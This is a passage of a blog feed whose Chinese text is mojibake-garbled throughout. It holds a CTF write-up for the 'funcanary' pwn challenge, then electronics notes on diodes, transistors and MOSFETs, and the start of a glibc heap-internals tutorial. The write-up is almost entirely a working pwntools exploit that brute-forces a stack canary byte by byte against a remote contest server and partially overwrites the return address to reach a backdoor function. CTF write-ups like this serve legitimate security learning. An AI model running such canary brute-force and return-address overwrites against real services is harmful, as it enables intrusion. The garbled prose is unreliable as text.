title="funcanary"></a>funcanary</h1><p>forkÂ≠êËøõÁ®ãÂ¥©Ê∫É‰∏çÊîπÂèòcanary,Âà©Áî®ËØ•ÊÄßË¥®ÈÄêÂ≠óËäÇÁàÜÁ†¥canary,ÂèëÁé∞ÂêéÈó®ÂáΩÊï∞ÔºåÁõ¥Êé•Ë¶ÜÁõñÂâç‰∏§‰ΩçÂú∞ÂùÄÔºåÁ¨¨‰∏â‰ΩçÁõ¥Êé•Áåú</p><p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173814568.png" alt="image-20230528173814568"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;123.57.248.214&quot;</span></span><br><span class="line">port = <span class="number">25775</span></span><br><span class="line"><span class="comment">#pt = process(&quot;./funcanary&quot;)</span></span><br><span class="line">pt = remote(host, port)</span><br><span class="line"></span><br><span class="line">pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="built_in">chr</span>(i)</span><br><span class="line">        pt.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = pt.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> a</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;fun&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line"></span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x02&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x12&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x22&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x32&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x42&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x52&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x62&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x72&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x82&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x92&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xa2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xb2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xc2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xd2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xe2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xf2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">‰ªÄ‰πàÊó∂ÂÄôÂá∫‰∏™Á≠æÂà∞È¢òÊñπÂêëÂïä</summary>
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
    <category term="wp" scheme="http://deepunk.icu/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ÂçäÂØº‰ΩìÂü∫Á°Ä</title>
    <link href="http://deepunk.icu/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80/"/>
    <id>http://deepunk.icu/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80/</id>
    <published>2023-05-26T13:03:48.000Z</published>
    <updated>2023-12-09T07:11:23.576Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Ê®°ÁîµÊàëÁúüÁöÑÂ•ΩÂñúÊ¨¢‰Ω†ÂïäÂïäÂïä:heart_eyes:</p></blockquote><h1 id="‰∫åÊûÅÁÆ°"><a href="#‰∫åÊûÅÁÆ°" class="headerlink" title="‰∫åÊûÅÁÆ°"></a>‰∫åÊûÅÁÆ°</h1><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526210931337.png" alt="image-20230526210931337"><br>$$<br>i&#x3D;I_s(e^{\frac{u}{U_T}}-1),Â∏∏Ê∏©‰∏ãU_T&#x3D;26mV<br>$$</p><h2 id="Á≠âÊïàÁîµË∑Ø"><a href="#Á≠âÊïàÁîµË∑Ø" class="headerlink" title="Á≠âÊïàÁîµË∑Ø"></a>Á≠âÊïàÁîµË∑Ø</h2><p><strong>Â§ß‰ø°Âè∑Ê®°ÂûãÔºö</strong></p><ul><li>ÁêÜÊÉ≥‰∫åÊûÅÁÆ°</li><li>ÁêÜÊÉ≥‰∫åÊûÅÁÆ°‰∏≤‰∏Ä‰∏™ÂèçÂêëÁöÑ$U_{ON}$ÁîµÂéãÊ∫ê</li></ul><p><strong>Â∞è‰ø°Âè∑Ê®°ÂûãÔºàÈùôÊÄÅÁÇπÈôÑËøëÔºâÔºö</strong></p><ul><li>Âä®ÊÄÅÁîµÈòª$r_d&#x3D;\frac{\Delta u_D}{\Delta i_D}\approx\frac{U_T}{I_D}$</li></ul><h2 id="‰∏ªË¶ÅÂèÇÊï∞"><a href="#‰∏ªË¶ÅÂèÇÊï∞" class="headerlink" title="‰∏ªË¶ÅÂèÇÊï∞"></a>‰∏ªË¶ÅÂèÇÊï∞</h2><ul><li><p>ÊúÄÂ§ßÊï¥ÊµÅÁîµÊµÅ$I_F$ÔºöÂπ≥Âùá</p></li><li><p>ÊúÄÂ§ßÂèçÂêëÂ∑•‰ΩúÁîµÂéã$U_R$ÔºöÁû¨Êó∂</p></li><li><p>ÂèçÂêëÁîµÊµÅ$I_R(I_S)$ </p></li><li><p>ÊúÄÈ´òÂ∑•‰ΩúÈ¢ëÁéá$f_M$ÔºöPNÁªìÊúâÁîµÂÆπÊïàÂ∫î</p></li></ul><h2 id="Á®≥Âéã‰∫åÊûÅÁÆ°"><a href="#Á®≥Âéã‰∫åÊûÅÁÆ°" class="headerlink" title="Á®≥Âéã‰∫åÊûÅÁÆ°"></a>Á®≥Âéã‰∫åÊûÅÁÆ°</h2><p>dddd</p><h1 id="Êô∂‰Ωì‰∏âÊûÅÁÆ°Triode"><a href="#Êô∂‰Ωì‰∏âÊûÅÁÆ°Triode" class="headerlink" title="Êô∂‰Ωì‰∏âÊûÅÁÆ°Triode"></a>Êô∂‰Ωì‰∏âÊûÅÁÆ°Triode</h1><p>:cry:</p><h2 id="ÁªìÊûÑ"><a href="#ÁªìÊûÑ" class="headerlink" title="ÁªìÊûÑ"></a>ÁªìÊûÑ</h2><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211007779.png" alt="image-20230526211007779"></p><h2 id="ÊîæÂ§ß‰ΩúÁî®"><a href="#ÊîæÂ§ß‰ΩúÁî®" class="headerlink" title="ÊîæÂ§ß‰ΩúÁî®"></a>ÊîæÂ§ß‰ΩúÁî®</h2><h3 id="ÊîæÂ§ßÊù°‰ª∂"><a href="#ÊîæÂ§ßÊù°‰ª∂" class="headerlink" title="ÊîæÂ§ßÊù°‰ª∂"></a>ÊîæÂ§ßÊù°‰ª∂</h3><ol><li>$U_{BE}&gt;U_{on}$ÔºåÂèëÂ∞ÑÁªìÊ≠£ÂÅè</li><li>$U_{CB}\geq0$ÔºåÂç≥$U_{CE}\geq U_{BE}$ÔºåÈõÜÁîµÁªìÂèçÂÅè</li></ol><h3 id="ÁîµÊµÅÂàÜÈÖç"><a href="#ÁîµÊµÅÂàÜÈÖç" class="headerlink" title="ÁîµÊµÅÂàÜÈÖç"></a>ÁîµÊµÅÂàÜÈÖç</h3><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211012892.png" alt="image-20230526211012892"><br>$$<br>I_E&#x3D;I_B+I_C<br>$$<br>ÂÖ±Â∞ÑÁîµÊµÅÊîæÂ§ßÁ≥ªÊï∞Ôºö<br>$$<br>\beta\approx\frac{I_C}{I_B}<br>$$<br>ÂÖ±Âü∫ÊûÅÁîµÊµÅÊîæÂ§ßÁ≥ªÊï∞Ôºö<br>$$<br>\alpha&#x3D;\frac{I_C}{I_E}<br>$$</p><h2 id="ËæìÂÖ•ËæìÂá∫ÁâπÊÄß"><a href="#ËæìÂÖ•ËæìÂá∫ÁâπÊÄß" class="headerlink" title="ËæìÂÖ•ËæìÂá∫ÁâπÊÄß"></a>ËæìÂÖ•ËæìÂá∫ÁâπÊÄß</h2><h3 id="ËæìÂÖ•ÁâπÊÄß"><a href="#ËæìÂÖ•ÁâπÊÄß" class="headerlink" title="ËæìÂÖ•ÁâπÊÄß"></a>ËæìÂÖ•ÁâπÊÄß</h3><p>$$<br>i_B&#x3D;f(u_{BE})\Big |<em>{U</em>{CE}}<br>$$</p><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211018315.png" alt="image-20230526211018315"></p><h2 id="ËæìÂá∫ÁâπÊÄß"><a href="#ËæìÂá∫ÁâπÊÄß" class="headerlink" title="ËæìÂá∫ÁâπÊÄß"></a>ËæìÂá∫ÁâπÊÄß</h2><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211022975.png" alt="image-20230526211022975"></p><h3 id="Êà™Ê≠¢Âå∫"><a href="#Êà™Ê≠¢Âå∫" class="headerlink" title="Êà™Ê≠¢Âå∫"></a>Êà™Ê≠¢Âå∫</h3><p>$$<br>u_{BE}&lt;U_{on},u_{BC}&lt;U_{on}<br>$$</p><h3 id="ÊîæÂ§ßÂå∫"><a href="#ÊîæÂ§ßÂå∫" class="headerlink" title="ÊîæÂ§ßÂå∫"></a>ÊîæÂ§ßÂå∫</h3><p>$$<br>u_{BE}\geq U_{on},u_{BC}&lt;U_{on}<br>$$</p><p>$$<br>i_C&#x3D;\beta i_B,\Delta i_C&#x3D;\beta\Delta i_B<br>$$</p><p>ËæìÂá∫ÂõûË∑ØÁîµÊµÅ$i_C$Âá†‰πé‰ªÖ‰ªÖÂèñÂÜ≥‰∫éËæìÂÖ•ÂõûË∑ØÁîµÊµÅ$i_B$ÔºåÂèØÁ≠âÊïà‰∏∫<strong>ÂèóÊéßÁîµÊµÅÊ∫ê</strong></p><h3 id="È•±ÂíåÂå∫"><a href="#È•±ÂíåÂå∫" class="headerlink" title="È•±ÂíåÂå∫"></a>È•±ÂíåÂå∫</h3><p>$$<br>u_{BE}\geq U_{on},u_{BC}\geq U_{on}<br>$$</p><p>Â§±ÂéªÊéßÂà∂‰ΩúÁî®ÔºåÈ•±ÂíåÂØºÈÄöÁä∂ÊÄÅ</p><h1 id="MOSFET"><a href="#MOSFET" class="headerlink" title="MOSFET"></a>MOSFET</h1><h1 id="MOSFETÊîæÂ§ßÁîµË∑Ø"><a href="#MOSFETÊîæÂ§ßÁîµË∑Ø" class="headerlink" title="MOSFETÊîæÂ§ßÁîµË∑Ø"></a>MOSFETÊîæÂ§ßÁîµË∑Ø</h1><h2 id="MOSFETÂ∞è‰ø°Âè∑ÂàÜÊûê"><a href="#MOSFETÂ∞è‰ø°Âè∑ÂàÜÊûê" class="headerlink" title="MOSFETÂ∞è‰ø°Âè∑ÂàÜÊûê"></a>MOSFETÂ∞è‰ø°Âè∑ÂàÜÊûê</h2><p>$$<br>I_D&#x3D;\frac{K(V_I-V_{TH})^2}{2}<br>$$</p><p>$$<br>i_d&#x3D;K(V_I-V_{TH})v_i<br>$$</p><h3 id="Â∞è‰ø°Âè∑Â¢ûÁõä"><a href="#Â∞è‰ø°Âè∑Â¢ûÁõä" class="headerlink" title="Â∞è‰ø°Âè∑Â¢ûÁõä"></a>Â∞è‰ø°Âè∑Â¢ûÁõä</h3><p>$$<br>\bigg|\frac{v_o}{v_i}\bigg|&#x3D;K(V_I-V_T)R_L<br>$$</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Ê®°ÁîµÊàëÁúüÁöÑÂ•ΩÂñúÊ¨¢‰Ω†ÂïäÂïäÂïä:heart_eyes:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;‰∫åÊûÅÁÆ°&quot;&gt;&lt;a href=&quot;#‰∫åÊûÅÁÆ°&quot; class=&quot;headerlink&quot; title=&quot;‰∫åÊûÅÁÆ°&quot;&gt;&lt;/a&gt;‰∫åÊûÅÁÆ°&lt;/h1&gt;&lt;p&gt;&lt;img sr</summary>
      
    
    
    
    <category term="ESE" scheme="http://deepunk.icu/categories/ESE/"/>
    
    
    <category term="ÁîµË∑ØÂàÜÊûê" scheme="http://deepunk.icu/tags/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>PWN‰ªéÂÖ•Èó®Âà∞Âá∫ÂÖ•Âπ≥ÂÆâÔºà‰∏âÔºâ‚Äî‚Äîheap</title>
    <link href="http://deepunk.icu/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap/"/>
    <id>http://deepunk.icu/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap/</id>
    <published>2023-05-22T15:22:05.000Z</published>
    <updated>2023-12-09T07:11:23.568Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ÂÜôÁöÑ‰∏çÂ•ΩÔºåÊúâÁ©∫ÂÜçÊîπ</p></blockquote><h1 id="Ê¶ÇËø∞"><a href="#Ê¶ÇËø∞" class="headerlink" title="Ê¶ÇËø∞"></a>Ê¶ÇËø∞</h1><h2 id="ÂàÜÁ±ª"><a href="#ÂàÜÁ±ª" class="headerlink" title="ÂàÜÁ±ª"></a>ÂàÜÁ±ª</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dlmalloc  ‚Äì General purpose allocator</span><br><span class="line">ptmalloc2 ‚Äì glibc</span><br><span class="line">jemalloc  ‚Äì FreeBSD and Firefox</span><br><span class="line">tcmalloc  ‚Äì Google</span><br><span class="line">libumem   ‚Äì Solaris</span><br></pre></td></tr></table></figure><h2 id="ÂàÜÈÖçÂ†ÜÁ©∫Èó¥"><a href="#ÂàÜÈÖçÂ†ÜÁ©∫Èó¥" class="headerlink" title="ÂàÜÈÖçÂ†ÜÁ©∫Èó¥"></a>ÂàÜÈÖçÂ†ÜÁ©∫Èó¥</h2><h3 id="brk-sbrk"><a href="#brk-sbrk" class="headerlink" title="brk&amp;sbrk"></a>brk&amp;sbrk</h3><p>main arena</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">brk</span><span class="params">(<span class="type">void</span> *addr)</span>;<span class="comment">//*addr‰∏∫Êï∞ÊçÆÊÆµÁªìÊùüÂú∞ÂùÄ</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">sbrk</span><span class="params">(<span class="type">intptr_t</span> increment)</span>;<span class="comment">//ËøîÂõûÊìç‰ΩúÂâçÊï∞ÊçÆÊÆµÁªìÊùüÂú∞ÂùÄ</span></span><br></pre></td></tr></table></figure><p>ÂºÄÂêØASLRÂêéÔºåBSS segmentÂíåheapÈó¥Â≠òÂú®Random brk offsetÔºõÂÖ≥Èó≠ÂêéÔºåÂ†ÜÂºÄÂßãÂú∞ÂùÄÂíåÊï∞ÊçÆÊÆµÁªìÊùüÂú∞ÂùÄÈáçÂêà</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br><span class="line">cat /proc/86231/maps</span><br></pre></td></tr></table></figure><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>thread arena</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> fildes, <span class="type">off_t</span> off)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len)</span>;</span><br></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *ptr)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> nmemb, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p>Á¨¨‰∏ÄÊ¨°ÊâßË°åmalloc</p><ul><li>size&gt;&#x3D;128kB<ul><li>mmap &#x3D;&gt; sys_mmap</li></ul></li><li>size&lt;128kB<ul><li>brk &#x3D;&gt; sys_brk</li></ul></li></ul><h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><p>ÊúÄÂ∞èSIZE_T(ul)*4</p><p>chunk header(prev_size+size)+user data</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>allocated chunk&#x2F;freed chunk:</p><ul><li>prev_size: Áâ©ÁêÜ‰∏äËøûÁª≠ÔºåÂâç‰∏ç‰∏∫Á©∫ÂèØÂ§çÁî®</li><li>size:<ul><li>NON_MAIN_ARENA(<strong>A</strong>)</li><li>IS_MAPPED(<strong>M</strong>)</li><li>PREV_INUSE(<strong>P</strong>)</li></ul></li><li>fd,bk: linked list‰∏≠Ôºåallocated chunk‰∏≠Â§çÁî®</li><li>fd_nextsize,bk_nextsize: large chunk(‰∏çÂê´bin)</li></ul><p>top chunk: </p><ul><li>prev_size</li><li>size: Ââ©‰∏ãÂ§öÂ∞ëÁ©∫Èó¥</li></ul><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230601221411859.png" alt="image-20230601221411859"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230601221609068.png" alt="image-20230601221609068"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230601222129466.png" alt="image-20230601222129466"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230619161203608.png" alt="image-20230619161203608"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230619161741499.png" alt="image-20230619161741499"></p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>10 